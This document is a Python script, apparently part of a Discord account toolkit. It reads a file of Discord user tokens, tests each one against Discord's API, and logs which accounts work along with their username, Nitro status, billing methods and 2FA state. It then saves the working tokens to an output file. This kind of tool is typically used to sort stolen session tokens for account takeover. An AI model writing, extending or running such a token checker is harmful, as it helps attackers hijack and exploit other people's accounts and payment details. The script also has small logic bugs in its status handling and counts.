from assets import *

r = '\033[90m'
c = Fore.RED
g = Fore.LIGHTBLACK_EX
s = Fore.BLACK
x = Fore.GREEN
k = Fore.YELLOW

dark_red_color = Fore.RED
light_green_color = '\033[92m'
grey_color = '\033[90m'
reset_color = '\033[0m'

RED = Fore.RED
RESET = "\033[0m"

timestamp = datetime.datetime.now().strftime(f'{Fore.RED}[{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RED}]{Fore.RED}')

banner = f"""
                                {Fore.RED} _____ _____ _____ _____ _____ _____ _____ 
                                |     |   __| __  |     |  |  | __  |   __|
                                | | | |   __|    -|   --|  |  |    -|   __|
                                \033[90m|_|_|_|_____|__|__|_____|_____|__|__|_____|
"""

def check_token(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            user_data = response.json()
            username = user_data.get('username', 'Not Available')
            nitro = user_data.get('premium_type', 0) != 0
            billing_amount = len(user_data.get('billing_methods', []))
            has_2fa = user_data.get('mfa_enabled', False)
            return (True, username, nitro, billing_amount, has_2fa, token)
        elif response.status_code == 401:
            return (False, "Invalid Token", None, None, None, token)
        elif response.status_code == 403:
            return (False, "Forbidden", None, None, None, token)
        elif response.status_code == 429:
            return (False, "Locked", None, None, None, token)
        else:
            return (False, "Unknown Error", None, None, None, token)
    except Exception as e:
        return (False, str(e), None, None, None, token)

def save_tokens(valid_tokens, file_path):
    try:
        with open(file_path, 'w') as f:
            for token_info in valid_tokens:
                f.write(token_info[5] + '\n')  
        print("                                Valid tokens saved successfully.")
    except Exception as e:
        print(f"                                Error saving tokens: {e}")

def token_checker():
    tokens_file = 'assets/input/tokens.txt'
    valid_tokens = []

    with open(tokens_file, 'r') as f:
        tokens = f.read().splitlines()

    self = """                  
                                \033[31m _____ _____ _____ _____ _____ _____ _____ 
                                |     |   __| __  |     |  |  | __  |   __|
                                | | | |   __|    -|   --|  |  |    -|   __|
                                \033[90m|_|_|_|_____|__|__|_____|_____|__|__|_____|
    """                                           
    print(self) 

    for token in tokens:
        status, username, nitro, billing_amount, has_2fa, token = check_token(token)
        if status is True:
            valid_tokens.append((status, username, nitro, billing_amount, has_2fa, token))
            print(f"{dark_red_color}                               {timestamp} {light_green_color}(+){light_green_color} {light_green_color}[{light_green_color}VALID{light_green_color}]{light_green_color} {grey_color}~>{grey_color} {grey_color}{token[:20]}{grey_color} {grey_color}~>{grey_color} {light_green_color}200{light_green_color}")
        elif status == "Forbidden":
            print(f"{dark_red_color}                               {timestamp} {grey_color}(+){grey_color} {grey_color}[{grey_color}LOCKED{grey_color}]{grey_color} {grey_color}~>{grey_color} {grey_color}{token[:20]}{grey_color} {grey_color}~>{grey_color} {grey_color}403{grey_color}")
        else:
            print(f"{dark_red_color}                               {timestamp} {dark_red_color}(+){dark_red_color} {dark_red_color}[{dark_red_color}INVALID{dark_red_color}]{dark_red_color} {grey_color}~>{grey_color} {grey_color}{token[:20]}{grey_color} {grey_color}~>{grey_color} {dark_red_color}403{dark_red_color}")

    os.system('cls' if os.name == 'nt' else 'clear')

    self = f"""                                              
                                \033[31m _____ _____ _____ _____ _____ _____ _____  
                                |     |   __| __  |     |  |  | __  |   __| | {light_green_color}Valid{light_green_color} {grey_color}>{grey_color} {dark_red_color}{len(valid_tokens)}
                                | | | |   __|    -|   --|  |  |    -|   __| | {dark_red_color}Invalid{dark_red_color} {grey_color}>{grey_color} {dark_red_color}0
                                \033[90m|_|_|_|_____|__|__|_____|_____|__|__|_____| {dark_red_color}| {grey_color}Locked{grey_color} {grey_color}>{grey_color} {dark_red_color}0
    """ 
    print(self) 

    try:
        directory = os.path.dirname('assets/output/valid_tokens.txt')
        print("                                Directory:", directory)
        os.makedirs(directory, exist_ok=True)
        save_tokens(valid_tokens, 'assets/output/valid_tokens.txt')
    except Exception as e:
        print(f"                                 {k}[{r}#{k}]{k} Error.")